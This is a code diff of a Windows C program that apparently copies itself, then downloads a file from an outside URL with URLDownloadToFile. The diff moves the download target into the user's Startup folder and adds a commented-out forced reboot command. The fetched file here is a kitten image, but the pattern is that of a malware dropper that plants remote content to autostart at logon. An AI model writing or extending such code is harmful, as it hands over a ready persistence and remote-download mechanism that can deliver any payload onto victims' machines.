@@ -22,11 +22,11 @@ int main(int argc, char* argv[])
   	CopyFile(charArray, path, TRUE);
   	
   	HRESULT hr;
-	LPCTSTR Url = _T("https://cdn.free.com.tw/blog/wp-content/uploads/2014/08/Placekitten480-g.jpg"), File = _T("C:\\Users\\rb\\Documents\\download.jpg");
+//	LPCTSTR Url = _T("https://cdn.free.com.tw/blog/wp-content/uploads/2014/08/Placekitten480-g.jpg"), File = _T("%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\download.jpg");
 //	TCHAR url[] = TEXT("https://cdn.free.com.tw/blog/wp-content/uploads/2014/08/Placekitten480-g.jpg");
 //	TCHAR path[MAX] = TEXT("C:\\Users\\rb\\Documents\\download.jpg");
 //	GetCurrentDirectory(MAX, path);
-
+	LPCTSTR Url = _T("https://cdn.free.com.tw/blog/wp-content/uploads/2014/08/Placekitten480-g.jpg"), File = _T("C:\\Users\\rb\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\download.jpg");
 	hr = URLDownloadToFile (0, Url, File, 0, 0);
 	switch (hr)
 	{
@@ -43,6 +43,8 @@ int main(int argc, char* argv[])
 			printf("Unknown error\n");
 			break;
 	}
+	//REBOOT SYSTEM
+	//system("c:\\windows\\system32\\shutdown /r /t 10 \n\n");
 	
 	//FreeConsole();
 	return 0;
